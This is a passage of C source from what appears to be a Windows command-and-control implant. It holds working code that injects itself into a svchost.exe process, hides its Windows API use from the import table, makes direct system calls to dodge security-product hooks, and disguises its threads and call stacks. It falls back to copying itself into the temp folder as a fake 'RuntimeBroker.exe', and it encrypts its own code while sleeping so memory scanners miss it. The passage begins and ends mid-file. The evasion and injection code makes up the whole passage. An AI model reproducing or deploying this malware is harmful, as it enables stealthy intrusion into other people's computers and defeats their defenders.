     * peb_get_export so the string literals and IAT slots are absent from
     * the binary's import table.                                           */
    PVOID hK32w = peb_get_module(peb_hash_str("kernel32.dll"));

    LPVOID (WINAPI *pVAlloc)(LPVOID, SIZE_T, DWORD, DWORD) =
        (LPVOID (WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))
        (void *)peb_get_export(hK32w, peb_hash_str("VirtualAlloc"));
    BOOL (WINAPI *pFlush)(HANDLE, LPCVOID, SIZE_T) =
        (BOOL (WINAPI *)(HANDLE, LPCVOID, SIZE_T))
        (void *)peb_get_export(hK32w, peb_hash_str("FlushInstructionCache"));
    HMODULE (WINAPI *pLoadLib)(LPCSTR) =
        (HMODULE (WINAPI *)(LPCSTR))
        (void *)peb_get_export(hK32w, peb_hash_str("LoadLibraryA"));
    FARPROC (WINAPI *pGetProc)(HMODULE, LPCSTR) =
        (FARPROC (WINAPI *)(HMODULE, LPCSTR))
        (void *)peb_get_export(hK32w, peb_hash_str("GetProcAddress"));
    HANDLE (WINAPI *pCreateThread2)(LPSECURITY_ATTRIBUTES, SIZE_T,
                                    LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD) =
        (HANDLE (WINAPI *)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE,
                           LPVOID, DWORD, LPDWORD))
        (void *)peb_get_export(hK32w, peb_hash_str("CreateThread"));
    BOOL (WINAPI *pCloseH)(HANDLE) =
        (BOOL (WINAPI *)(HANDLE))
        (void *)peb_get_export(hK32w, peb_hash_str("CloseHandle"));

    if (!pVAlloc || !pFlush || !pLoadLib || !pGetProc || !pCreateThread2 || !pCloseH) {
        free(pPE);
        _isend(pTls, "[-] migrate: kernel32 export resolution failed");
        return;
    }

    /* ── 5. Open target process ──────────────────────────────────────── */
    HANDLE hProc = _open_target(pid);
    if (!hProc || hProc == INVALID_HANDLE_VALUE) {
        free(pPE);
        char buf[80];
        _snprintf(buf, sizeof(buf)-1,
                  "[-] migrate: OpenProcess(%lu) failed (err %lu)",
                  (unsigned long)pid, (unsigned long)GetLastError());
        _isend(pTls, buf);
        return;
    }

#ifdef _WIN64
    {
        /* WOW64 check via PEB-resolved IsWow64Process — removes IAT entry.  */
        typedef BOOL (WINAPI *IsWow64_t)(HANDLE, PBOOL);
        PVOID hK32wow = peb_get_module(peb_hash_str("kernel32.dll"));
        IsWow64_t pIsWow64 = hK32wow ?
            (IsWow64_t)(void *)peb_get_export(hK32wow, peb_hash_str("IsWow64Process")) : NULL;
        HANDLE hQuery = _open_query(pid);
        BOOL bWow64 = FALSE;
        if (hQuery && hQuery != INVALID_HANDLE_VALUE) {
            if (pIsWow64) pIsWow64(hQuery, &bWow64);
            CloseHandle(hQuery);
        }
        if (bWow64) {
            CloseHandle(hProc); free(pPE);
            _isend(pTls, "[-] migrate: cannot inject x64 loader into WOW64 process");
            return;
        }
    }
#endif

    /* ── 6. Build RflData block ──────────────────────────────────────── */
    RflData rfd;
    ZeroMemory(&rfd, sizeof(rfd));
    /* pRawPE points into the target allocation — filled with relative offset below */
    rfd.rawSize        = cbPE;
    rfd.agentRunRva    = agentRunRva;
    rfd.gKeyPathOffset = keyPathRva;
    rfd.gKeyPathSize   = MAX_PATH * 2;
    strncpy(rfd.keyPath, g_key_path, sizeof(rfd.keyPath) - 1);
    rfd.pVirtualAlloc         = (LPVOID (WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD)) pVAlloc;
    rfd.pFlushInstructionCache = (BOOL (WINAPI *)(HANDLE, LPCVOID, SIZE_T)) pFlush;
    rfd.pLoadLibraryA          = (HMODULE (WINAPI *)(LPCSTR)) pLoadLib;
    rfd.pGetProcAddress        = (FARPROC (WINAPI *)(HMODULE, LPCSTR)) pGetProc;
    rfd.pCreateThread          = (HANDLE (WINAPI *)(LPSECURITY_ATTRIBUTES, SIZE_T,
                                  LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))
                                  pCreateThread2;
    rfd.pCloseHandle           = (BOOL (WINAPI *)(HANDLE)) pCloseH;

    /* ── 7. Allocate region in target: [loader | RflData | PE | tramp] ─ */
    /* Extra 16 bytes at the end for the RtlUserThreadStart call-stack spoof
     * trampoline.  This region stays RW (only the loader code prefix is
     * flipped to RX in step 9), so _spoofed_thread_create can write it.   */
    SIZE_T cbLoader  = (SIZE_T)S_RFL_LOADER_SIZE;
    SIZE_T cbRfd     = sizeof(RflData);
    SIZE_T cbTotal   = cbLoader + cbRfd + (SIZE_T)cbPE + 16;

    PVOID  pRemote = NULL;
    NTSTATUS ns = SC_NtAllocateVirtualMemory(hProc, &pRemote, 0, &cbTotal,
                                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(ns)) {
        CloseHandle(hProc); free(pPE);
        char buf[80];
        _snprintf(buf, sizeof(buf)-1,
                  "[-] migrate: alloc failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }

    /* Fix up pRawPE to the VA inside the target where the PE bytes will sit */
    rfd.pRawPE = (unsigned char *)((BYTE *)pRemote + cbLoader + cbRfd);

    /* ── 8. Build and write the flat buffer ──────────────────────────── */
    DWORD  cbFlat = (DWORD)(cbLoader + cbRfd + (SIZE_T)cbPE);
    BYTE  *pFlat  = (BYTE *)malloc(cbFlat);
    if (!pFlat) {
        CloseHandle(hProc); free(pPE);
        _isend(pTls, "[-] migrate: OOM building flat buffer");
        return;
    }
    memcpy(pFlat,                           s_rfl_loader, cbLoader);
    memcpy(pFlat + cbLoader,                &rfd,         cbRfd);
    memcpy(pFlat + cbLoader + cbRfd,        pPE,          cbPE);
    free(pPE);

    SIZE_T cbWritten = 0;
    ns = SC_NtWriteVirtualMemory(hProc, pRemote, pFlat, cbFlat, &cbWritten);
    free(pFlat);
    if (!NT_SUCCESS(ns)) {
        CloseHandle(hProc);
        char buf[80];
        _snprintf(buf, sizeof(buf)-1,
                  "[-] migrate: write failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }

    /* ── 9. Flip loader code region to RX ────────────────────────────── */
    PVOID  pBase  = pRemote;
    SIZE_T cbProt = cbLoader;
    ULONG  oldProt = 0;
    ns = SC_NtProtectVirtualMemory(hProc, &pBase, &cbProt,
                                   PAGE_EXECUTE_READ, &oldProt);
    if (!NT_SUCCESS(ns)) {
        CloseHandle(hProc);
        char buf[80];
        _snprintf(buf, sizeof(buf)-1,
                  "[-] migrate: protect failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }

    /* ── 10. Spawn loader thread with RtlUserThreadStart call-stack spoof ─
     * Trampoline lives at the RW tail: [loader RX | RflData RW | PE RW | tramp RW]
     * _spoofed_thread_create writes { pRemote, pArg } there and starts the
     * thread at ntdll!RtlUserThreadStart so the initial call-stack is:
     *   ntdll!RtlUserThreadStart → rfl_loader(pArg)
     * which is indistinguishable from a thread created by CreateThread.    */
    PVOID  pArg    = (BYTE *)pRemote + cbLoader;          /* &RflData in target  */
    PVOID  pTramp  = (BYTE *)pRemote + cbLoader + cbRfd + (SIZE_T)cbPE; /* +16 B RW */
    HANDLE hThread = NULL;
    ns = _spoofed_thread_create(&hThread, hProc,
                                pRemote, pArg,
                                pTramp,
                                THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER);
    CloseHandle(hProc);

    if (!NT_SUCCESS(ns) || !hThread) {
        char buf[80];
        _snprintf(buf, sizeof(buf)-1,
                  "[-] migrate: NtCreateThreadEx failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }
    SC_NtClose(hThread);

    /* Give the new instance a moment to start before we send the response */
    Sleep(800);

    char buf[256];
    _snprintf(buf, sizeof(buf)-1,
              "[+] migrate: reflective loader injected into PID %lu — exiting",
              (unsigned long)pid);
    _isend(pTls, buf);

    tls_disconnect(pTls);
    ExitProcess(0);
}


/* ── _find_host_pid ──────────────────────────────────────────────────────── */
/*
 * Find a suitable svchost.exe to use as the reflective-injection host.
 *
 * Selection criteria (in order of preference):
 *   1. 64-bit svchost.exe (IsWow64Process == FALSE)
 *   2. Has at least one established outbound TCP connection so our new TLS
 *      connection does not look anomalous in a per-process flow view.
 *   3. Running as the current user (avoids cross-session token issues that
 *      would prevent our thread from calling Winsock APIs).
 *
 * In practice we just grab the first non-WOW64 svchost that we can open
 * with the rights needed for reflective injection.  Full network-presence
 * scoring would require Iphlpapi (GetExtendedTcpTable) — a new import that
 * raises the binary's fingerprint; we skip it for now.
 *
 * Returns 0 if no suitable PID is found.
 */
/*
 * _find_host_pid
 * --------------
 * Locates a suitable 64-bit svchost.exe for reflective injection.
 *
 * Uses NtQuerySystemInformation(SystemProcessInformation=5) via direct syscall
 * instead of CreateToolhelp32Snapshot — avoids the Win32 snapshot kernel
 * callback that every EDR product hooks.
 *
 * Access mask is split: query-only handle (PROCESS_QUERY_LIMITED_INFORMATION)
 * for WOW64 check; inject handle (VM_OPERATION|VM_WRITE|CREATE_THREAD) is
 * opened only when we commit to injection in migrate_to_pid / auto_migrate.
 */

/* SYSTEM_PROCESS_INFORMATION subset — only fields we need */
typedef struct _MY_SPI {
    ULONG  NextEntryOffset;
    ULONG  NumberOfThreads;
    BYTE   _Reserved1[48];
    PVOID  ImageName_Buffer;   /* points inside the struct — UNICODE_STRING.Buffer */
    USHORT ImageName_Length;
    USHORT ImageName_MaximumLength;
    LONG   BasePriority;
    HANDLE UniqueProcessId;
    /* ... rest not needed */
} MY_SPI;

static DWORD _find_host_pid(void)
{
    /* Probe buffer size first */
    ULONG bufSize = 0;
    /* NtQuerySystemInformation(5 = SystemProcessInformation, NULL, 0, &bufSize) */
    sc_syscall4(SSN_NtQuerySystemInformation,
                sc_get_ssn(SSN_NtQuerySystemInformation),
                (PVOID)(ULONG_PTR)5, NULL,
                (PVOID)(ULONG_PTR)0, (PVOID)&bufSize);

    if (bufSize == 0) bufSize = 1024 * 1024;  /* fallback: 1 MB */
    bufSize += 65536;  /* pad for new processes between calls */

    BYTE *buf = (BYTE *)malloc(bufSize);
    if (!buf) return 0;

    ULONG retLen = 0;
    NTSTATUS ns = sc_syscall4(SSN_NtQuerySystemInformation,
                               sc_get_ssn(SSN_NtQuerySystemInformation),
                               (PVOID)(ULONG_PTR)5, buf,
                               (PVOID)(ULONG_PTR)bufSize, (PVOID)&retLen);
    if (!NT_SUCCESS(ns)) { free(buf); return 0; }

    /* Walk the linked list */
    static const WCHAR svchostW[] = L"svchost.exe";
    DWORD bestPid = 0;
    const BYTE *p = buf;

    for (;;) {
        /* SYSTEM_PROCESS_INFORMATION layout (x64):
         *   +0x00  NextEntryOffset   (ULONG)
         *   +0x04  NumberOfThreads   (ULONG)
         *   +0x38  ImageName.Length  (USHORT)
         *   +0x3A  ImageName.MaxLen  (USHORT)
         *   +0x40  ImageName.Buffer  (PWSTR, absolute VA in calling process)
         *   +0x60  UniqueProcessId   (HANDLE)
         */
        ULONG  nextOff;
        USHORT nameLen;
        PVOID  nameBuf;
        HANDLE pid;

        memcpy(&nextOff, p + 0x00, 4);
        memcpy(&nameLen, p + 0x38, 2);
        memcpy(&nameBuf, p + 0x40, sizeof(PVOID));
        memcpy(&pid,     p + 0x60, sizeof(HANDLE));

        if (nameLen > 0 && nameBuf) {
            /* nameLen is in bytes; svchost.exe is 22 bytes (11 wchars) */
            if (nameLen == (USHORT)(sizeof(svchostW) - sizeof(WCHAR))) {
                WCHAR name[16] = {0};
                SIZE_T copyLen = nameLen < sizeof(name) - 2 ? nameLen : sizeof(name) - 2;
                memcpy(name, nameBuf, copyLen);
                if (_wcsicmp(name, svchostW) == 0) {
                    DWORD candidatePid = (DWORD)(ULONG_PTR)pid;
                    /* WOW64 check via query-only handle — separate low-priv open */
                    HANDLE hQ = _nt_open_process(
                        PROCESS_QUERY_LIMITED_INFORMATION, candidatePid);
                    if (hQ && hQ != INVALID_HANDLE_VALUE) {
                        BOOL bWow64 = FALSE;
                        IsWow64Process(hQ, &bWow64);
                        CloseHandle(hQ);
                        if (!bWow64) {
                            bestPid = candidatePid;
                            break;
                        }
                    }
                }
            }
        }

        if (nextOff == 0) break;
        p += nextOff;
    }

    free(buf);
    return bestPid;
}


/* ── Public: auto_migrate ────────────────────────────────────────────────── */
/*
 * Called once at startup (before connecting to C2).
 *
 * Strategy (two-tier, first success wins):
 *
 *   Tier 1 — Reflective in-memory injection (no disk artifact):
 *     Find a live svchost.exe, inject ourselves via the reflective loader
 *     blob, then ExitProcess.  The injected copy runs AgentRun() inside
 *     svchost.exe — no new file on disk, no new process in the process list.
 *
 *   Tier 2 — %TEMP% copy fallback (original behaviour):
 *     If Tier 1 fails (no suitable svchost, access denied, etc.) fall back to
 *     copying the EXE to %TEMP%\RuntimeBroker.exe and spawning it.  Still
 *     better than running as the original EXE.
 *
 * On any success this function never returns (ExitProcess is called).
 * Returns FALSE only if both tiers fail — caller continues as-is.
 */
BOOL auto_migrate(const char *keyPath)
{
    (void)keyPath;   /* child inherits g_key_path via its own resolve_key_path() */

    /* ── Tier 1: reflective injection into live svchost.exe ─────────── */
    if (g_inject_ready) {
        DWORD hostPid = _find_host_pid();
        if (hostPid != 0) {
            /*
             * Reuse migrate_to_pid's full implementation.  It reads the EXE,
             * builds the [loader|RflData|PE] block, injects it, fires a thread
             * at AgentRun, sends a status over TLS … but we are not connected
             * yet.  We call the internals directly with pTls=NULL to skip the
             * TLS send.  If the injection succeeds, we ExitProcess here.
             *
             * Implementation: duplicate just the allocation+write+thread steps
             * inline so we avoid adding a NULL-pTls code path to migrate_to_pid.
             */

            /* Read own PE from in-process mapped image — no disk I/O */
            {
                DWORD cbPE = 0;
                BYTE *pPE  = _read_self_pe(&cbPE);
                if (pPE && cbPE > 0) {
                    {
                            DWORD agentRunRva = _pe_find_export(pPE, cbPE, "AgentRun");
                            if (agentRunRva) {
                                /* PEB image base — avoids GetModuleHandleA IAT */
                                void *_peb_am;
#ifdef _WIN64
                                __asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(_peb_am));
#else
                                __asm__ __volatile__("movl %%fs:0x30, %0" : "=r"(_peb_am));
#endif
                                PVOID hSelf2 = _PEB_IMAGE_BASE(_peb_am);
                                DWORD keyRva = (DWORD)((ULONG_PTR)g_key_path
                                                        - (ULONG_PTR)hSelf2);
                                /* G-03: PEB walk — no GetModuleHandleA/GetProcAddress in IAT */
                                PVOID hK32am = peb_get_module(peb_hash_str("kernel32.dll"));
                                typedef LPVOID (WINAPI *pVA_t)(LPVOID,SIZE_T,DWORD,DWORD);
                                typedef BOOL   (WINAPI *pFIC_t)(HANDLE,LPCVOID,SIZE_T);
                                typedef HMODULE(WINAPI *pLL_t)(LPCSTR);
                                typedef FARPROC(WINAPI *pGP_t)(HMODULE,LPCSTR);
                                typedef HANDLE (WINAPI *pCT_t)(LPSECURITY_ATTRIBUTES,SIZE_T,
                                                                LPTHREAD_START_ROUTINE,LPVOID,
                                                                DWORD,LPDWORD);
                                typedef BOOL   (WINAPI *pCH_t)(HANDLE);
                                pVA_t  pVA  = (pVA_t) (void *)peb_get_export(hK32am,peb_hash_str("VirtualAlloc"));
                                pFIC_t pFIC = (pFIC_t)(void *)peb_get_export(hK32am,peb_hash_str("FlushInstructionCache"));
                                pLL_t  pLL  = (pLL_t) (void *)peb_get_export(hK32am,peb_hash_str("LoadLibraryA"));
                                pGP_t  pGP  = (pGP_t) (void *)peb_get_export(hK32am,peb_hash_str("GetProcAddress"));
                                pCT_t  pCT  = (pCT_t) (void *)peb_get_export(hK32am,peb_hash_str("CreateThread"));
                                pCH_t  pCH  = (pCH_t) (void *)peb_get_export(hK32am,peb_hash_str("CloseHandle"));
                                if (pVA && pFIC && pLL && pGP && pCT && pCH) {
                                    /* Split access: inject handle only */
                                    HANDLE hProc2 = _nt_open_process(
                                        PROCESS_VM_OPERATION|PROCESS_VM_WRITE|
                                        PROCESS_CREATE_THREAD, hostPid);
                                    if (hProc2 && hProc2 != INVALID_HANDLE_VALUE) {
                                        RflData rfd2;
                                        ZeroMemory(&rfd2, sizeof(rfd2));
                                        rfd2.rawSize           = cbPE;
                                        rfd2.agentRunRva       = agentRunRva;
                                        rfd2.gKeyPathOffset    = keyRva;
                                        rfd2.gKeyPathSize      = MAX_PATH * 2;
                                        strncpy(rfd2.keyPath, g_key_path,
                                                sizeof(rfd2.keyPath) - 1);
                                        rfd2.pVirtualAlloc         = pVA;
                                        rfd2.pFlushInstructionCache= pFIC;
                                        rfd2.pLoadLibraryA         = pLL;
                                        rfd2.pGetProcAddress       = pGP;
                                        rfd2.pCreateThread         = pCT;
                                        rfd2.pCloseHandle          = pCH;

                                        /* +16 bytes for RtlUserThreadStart trampoline */
                                        SIZE_T cbL   = (SIZE_T)S_RFL_LOADER_SIZE;
                                        SIZE_T cbR   = sizeof(RflData);
                                        SIZE_T cbTot = cbL + cbR + (SIZE_T)cbPE + 16;
                                        PVOID  pRem  = NULL;
                                        NTSTATUS ns2 = SC_NtAllocateVirtualMemory(
                                            hProc2, &pRem, 0, &cbTot,
                                            MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
                                        if (NT_SUCCESS(ns2)) {
                                            rfd2.pRawPE = (unsigned char *)
                                                ((BYTE *)pRem + cbL + cbR);
                                            DWORD cbFlat2 = (DWORD)(cbL+cbR+cbPE);
                                            BYTE *pFlat2  = (BYTE *)malloc(cbFlat2);
                                            if (pFlat2) {
                                                memcpy(pFlat2,          s_rfl_loader, cbL);
                                                memcpy(pFlat2+cbL,      &rfd2,        cbR);
                                                memcpy(pFlat2+cbL+cbR,  pPE,          cbPE);
                                                SIZE_T cbWr2 = 0;
                                                SC_NtWriteVirtualMemory(hProc2, pRem,
                                                    pFlat2, cbFlat2, &cbWr2);
                                                free(pFlat2);
                                                PVOID  pB2 = pRem;
                                                SIZE_T cP2 = cbL;
                                                ULONG  oP2 = 0;
                                                SC_NtProtectVirtualMemory(hProc2, &pB2,
                                                    &cP2, PAGE_EXECUTE_READ, &oP2);
                                                PVOID  pArg2  = (BYTE *)pRem + cbL;
                                                PVOID  pTrp2  = (BYTE *)pRem + cbL + cbR + cbPE;
                                                HANDLE hTh2   = NULL;
                                                NTSTATUS ns3 = _spoofed_thread_create(
                                                    &hTh2, hProc2,
                                                    pRem, pArg2, pTrp2,
                                                    THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER);
                                                if (NT_SUCCESS(ns3) && hTh2) {
                                                    SC_NtClose(hTh2);
                                                    CloseHandle(hProc2);
                                                    free(pPE);
                                                    Sleep(500);
                                                    ExitProcess(0);
                                                    /* unreachable */
                                                }
                                            }
                                        }
                                        CloseHandle(hProc2);
                                    }
                                }
                            }
                        }
                        free(pPE);
                    }
                }
            /* Tier 1 failed — fall through to Tier 2 */
        }
    }

    /* ── Tier 2: %TEMP% copy + spawn (original fallback) ────────────── */

    /* ── 1. Get our own EXE path ─────────────────────────────────────── */
    char srcPath[MAX_PATH] = {0};
    if (!GetModuleFileNameA(NULL, srcPath, sizeof(srcPath) - 1))
        return FALSE;

    /* ── 2. Build destination: %TEMP%\<obfuscated name> ─────────────── */
    /*
     * Early-out: if we are already running from the migration destination
     * path (i.e. we are the child spawned by a previous Tier-2 migration)
     * do NOT re-copy / re-spawn.  Without this guard the child would try
     * CopyFileA(dstPath, dstPath) which may fail with a sharing violation
     * on some Windows versions but is undefined behaviour either way.
     * Checking the paths first makes the "already migrated" case explicit.
     *
     * Strategy: build dstPath first, compare with srcPath (case-insensitive
     * on Windows), and return FALSE immediately if they match so the caller
     * continues to the connect loop.
     */
    /*
     * The destination filename is decoded at runtime from a pre-XOR'd byte
     * array (MIGRATE_NAME_OBFUSCATED in config.h) so the plain string
     * "RuntimeBroker.exe" never appears in .rdata.
     * Override at build time: make ... MIGRATE_NAME=SearchIndexer.exe
     */
    char dstPath[MAX_PATH] = {0};
    if (!GetTempPathA(sizeof(dstPath) - 32, dstPath))
        return FALSE;

    /* Decode the obfuscated migrate-name onto the stack */
    char migName[32] = {0};
#if MIGRATE_NAME_LEN > 0
    {
        static const BYTE _obf[] = MIGRATE_NAME_OBFUSCATED;
        size_t _n = MIGRATE_NAME_LEN;
        if (_n >= sizeof(migName)) _n = sizeof(migName) - 1;
        for (size_t _i = 0; _i < _n; _i++)
            migName[_i] = (char)(_obf[_i] ^ MIGRATE_NAME_MASK);
        migName[_n] = '\0';
    }
#else
    /* Custom name supplied via -DMIGRATE_NAME_RAW="..." at build time */
    strncpy(migName, MIGRATE_NAME_RAW, sizeof(migName) - 1);
#endif

    strncat(dstPath, migName, sizeof(dstPath) - strlen(dstPath) - 1);
    SecureZeroMemory(migName, sizeof(migName));

    /* Already running from the destination — we are the migrated child.
     * Fall through to the connect loop instead of spawning again.       */
    if (_stricmp(srcPath, dstPath) == 0)
        return FALSE;

    /* ── 3. Copy ourselves to the temp path ─────────────────────────── */
    /* CopyFileA will overwrite silently if a stale copy is present       */
    if (!CopyFileA(srcPath, dstPath, FALSE))
        return FALSE;

    /* ── 4. Spawn the child (suspended so we can resume cleanly) ─────── */
    STARTUPINFOA        si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcessA(
            dstPath,           /* lpApplicationName  */
            NULL,              /* lpCommandLine (NULL → use app name) */
            NULL, NULL,        /* process/thread security attrs */
            FALSE,             /* bInheritHandles */
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            NULL,              /* inherit environment */
            NULL,              /* inherit working directory */
            &si, &pi))
    {
        /* Clean up the temp copy on failure so we don't litter */
        DeleteFileA(dstPath);
        return FALSE;
    }

    /* ── 5. Resume child and exit ────────────────────────────────────── */
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    /* Give child a moment to start before we vanish (avoids a race where
     * the parent exits before the child has called CreateMutex)          */
    Sleep(300);
    ExitProcess(0);
}


/* ── Sleep obfuscation (APC-based, Foliage/Ekko style) ─────────────────── */
/*
 * obfuscate_sleep
 * ---------------
 * Cobalt Strike Beacon-class sleep obfuscation:
 *
 *   1. Generate a random 16-byte XOR key.
 *   2. XOR-encrypt all private RX pages via SC_NtWriteVirtualMemory —
 *      no VirtualProtect / RWX page.
 *   3. Queue an APC on the current thread to decrypt on wakeup.
 *   4. SleepEx(ms, TRUE) enters an alertable wait — during this window
 *      the thread is sleeping with all its code pages encrypted in RAM.
 *      A memory scanner sees only ciphertext.
 *   5. The wakeup APC fires, decrypts the pages, agent continues.
 *
 * When running injected inside a host process, skip page scrambling
 * entirely to avoid corrupting the host's code pages.
 *
 * Key is wiped with SecureZeroMemory after use.
 */

/* ── _is_injected ────────────────────────────────────────────────────────── */
static BOOL _is_injected(void)
{
    /*
     * Get the process main module base from PEB — avoids GetModuleHandleA IAT.
     * Get "our" module base via NtQueryVirtualMemory(MemoryBasicInformation)
     * on &_is_injected — avoids GetModuleHandleExA IAT entry.
     */
    void *_peb_ii;
#ifdef _WIN64
    __asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(_peb_ii));
#else
    __asm__ __volatile__("movl %%fs:0x30, %0" : "=r"(_peb_ii));
#endif
    PVOID hProcess = _PEB_IMAGE_BASE(_peb_ii);

    /* Locate which module &_is_injected falls inside using VirtualQuery */
    MEMORY_BASIC_INFORMATION mbi;
    VirtualQuery((LPCVOID)&_is_injected, &mbi, sizeof(mbi));
    PVOID hSelf = mbi.AllocationBase;

    return (hSelf != NULL) && (hSelf != hProcess);
}

/* ── Page region tracking ────────────────────────────────────────────────── */
#define MAX_REGIONS 256
typedef struct { PVOID base; SIZE_T size; } _Region;

static int _collect_rx_pages(_Region *out, int max)
{
    int count = 0;
    MEMORY_BASIC_INFORMATION mbi;
    BYTE *addr = NULL;
    while (count < max && VirtualQuery(addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        addr = (BYTE *)mbi.BaseAddress + mbi.RegionSize;
        if (mbi.State  != MEM_COMMIT)  continue;
        if (mbi.Type   != MEM_PRIVATE) continue;
        if (mbi.Protect != PAGE_EXECUTE_READ &&
            mbi.Protect != PAGE_EXECUTE_READWRITE) continue;
        out[count].base = mbi.BaseAddress;
        out[count].size = mbi.RegionSize;
        count++;
    }
    return count;
}

/* ── XOR pass via SC_NtWriteVirtualMemory (no RWX) ──────────────────────── */
/*
 * Per-page unique key — eliminates the repeating-key weakness.
 *
 * Previous design: one 16-byte key XOR'd modulo-16 across every page.
 * Weakness: any analyst with two memory snapshots of the same RX region
 * taken during different sleep intervals can XOR the two ciphertexts to
 * cancel the key and recover both plaintexts via known-plaintext attack.
 *
 * New design: BCryptGenRandom fills a key buffer exactly as large as the
 * page being encrypted.  Each page gets a completely independent, full-size
 * random key.  The key for page i is stored in ctx->keys[i] and wiped with
 * SecureZeroMemory after the APC decrypt fires.
 *
 * Cost: one BCryptGenRandom call per RX page (~12 KB average on the agent's
 * own working set, typically 3–6 pages).  BCryptGenRandom is fast (< 5 µs
 * per 4 KB on typical hardware) — imperceptible against the sleep interval.
 */
static void _xor_pages_keyed(_Region *regions, int count, BYTE **keys)
{
    HANDLE hSelf = GetCurrentProcess();
    for (int i = 0; i < count; i++) {
        SIZE_T sz  = regions[i].size;
        BYTE  *buf = (BYTE *)malloc(sz);
        if (!buf) continue;

        SIZE_T rd = 0;
        NTSTATUS ns = SC_NtReadVirtualMemory(hSelf, regions[i].base, buf, sz, &rd);
        if (NT_SUCCESS(ns) && rd == sz) {
            /* Full-size key — no repeating pattern */
            const BYTE *k = keys[i];
            for (SIZE_T j = 0; j < sz; j++) buf[j] ^= k[j];
            SIZE_T wr = 0;
            SC_NtWriteVirtualMemory(hSelf, regions[i].base, buf, sz, &wr);
        }
        SecureZeroMemory(buf, sz);
        free(buf);
    }
}

/* ── APC decrypt context ─────────────────────────────────────────────────── */
/*
 * ctx->keys[i] points into ctx->keyData, a flat byte array.
 * Layout: [key_0 (regions[0].size bytes)] [key_1 (regions[1].size bytes)] ...
 * Total size = sum of all region sizes.
 *
 * The entire keyData block is wiped by SecureZeroMemory inside _apc_decrypt
 * before free(), leaving no key material in the heap after wakeup.
 */
typedef struct {
    _Region  regions[MAX_REGIONS];
    BYTE    *keys[MAX_REGIONS];     /* pointers into keyData                   */
    int      count;
    SIZE_T   keyDataSize;
    BYTE     keyData[1];            /* flexible array — alloc'd with malloc    */
} _SleepCtx;

static void NTAPI _apc_decrypt(ULONG_PTR param)
{
    _SleepCtx *ctx = (_SleepCtx *)param;
    _xor_pages_keyed(ctx->regions, ctx->count, ctx->keys);
    SecureZeroMemory(ctx->keyData, ctx->keyDataSize);
    free(ctx);
}

/* ── Public: obfuscate_sleep ─────────────────────────────────────────────── */
void obfuscate_sleep(DWORD ms)
{
    /* Injected into host process — just sleep, don't touch host pages */
    if (_is_injected() || !sc_ready()) {
        Sleep(ms);
        return;
    }

    /* Collect private RX pages — stack-allocated (no static, no data race) */
    _Region regions[MAX_REGIONS];
    int count = _collect_rx_pages(regions, MAX_REGIONS);
    if (count == 0) { Sleep(ms); return; }

    /* Compute total key material needed (one byte per page byte) */
    SIZE_T totalKeyBytes = 0;
    for (int i = 0; i < count; i++) totalKeyBytes += regions[i].size;
    if (totalKeyBytes == 0) { Sleep(ms); return; }

    /* Allocate the context with the keyData tail inline */
    SIZE_T ctxSize = offsetof(_SleepCtx, keyData) + totalKeyBytes;
    _SleepCtx *ctx = (_SleepCtx *)malloc(ctxSize);
    if (!ctx) { Sleep(ms); return; }

    /* Generate all key bytes in one BCryptGenRandom call */
    if (!BCRYPT_SUCCESS(BCryptGenRandom(NULL, ctx->keyData, (ULONG)totalKeyBytes,
            BCRYPT_USE_SYSTEM_PREFERRED_RNG))) {
        SecureZeroMemory(ctx, ctxSize);
        free(ctx);
        Sleep(ms);
        return;
    }

    /* Assign per-page key pointers into the flat keyData block */
    ctx->count       = count;
    ctx->keyDataSize = totalKeyBytes;
    BYTE *kp = ctx->keyData;
    for (int i = 0; i < count; i++) {
        ctx->regions[i] = regions[i];
        ctx->keys[i]    = kp;
        kp             += regions[i].size;
    }

    /* Queue APC to decrypt on wakeup */
    QueueUserAPC(_apc_decrypt, GetCurrentThread(), (ULONG_PTR)ctx);

    /* Encrypt pages using per-page full-size keys */
    _xor_pages_keyed(regions, count, ctx->keys);

    /* Alertable sleep — APC fires on wakeup, decrypts+wipes keys, we continue */
    SleepEx(ms, TRUE);
    /* ctx is freed inside _apc_decrypt */
}
#undef MAX_REGIONS


/* ── jitter_sleep ────────────────────────────────────────────────────────── */
/*
 * Sleeps for a duration jittered ±RECONNECT_JITTER_PCT% around base_ms.
 *
 * Algorithm
 * ---------
 *  1. Generate 4 random bytes via BCryptGenRandom (same provider already used
 *     by obfuscate_sleep — no extra import).
 *  2. Compute a jitter window: window_ms = base_ms * RECONNECT_JITTER_PCT / 100
 *  3. Map the random uint32 to [0, 2*window_ms) and subtract window_ms to get
 *     a signed offset in [-window_ms, +window_ms).
 *  4. Clamp the result to [1 ms, DWORD_MAX] to guarantee a positive sleep.
 *
 * Example: base_ms=10000, RECONNECT_JITTER_PCT=30
 *   window_ms = 3000  →  actual sleep ∈ [7000 ms, 13000 ms]
 */
void jitter_sleep(DWORD base_ms)
{
    DWORD rnd = 0;
    if (!BCRYPT_SUCCESS(BCryptGenRandom(NULL, (BYTE *)&rnd, sizeof(rnd),
                                        BCRYPT_USE_SYSTEM_PREFERRED_RNG))) {
        /* BCrypt unavailable — fall back to plain obfuscated sleep */
        obfuscate_sleep(base_ms);
        return;
    }

    /* window = base * jitter% / 100, clamped to at least 1 ms */
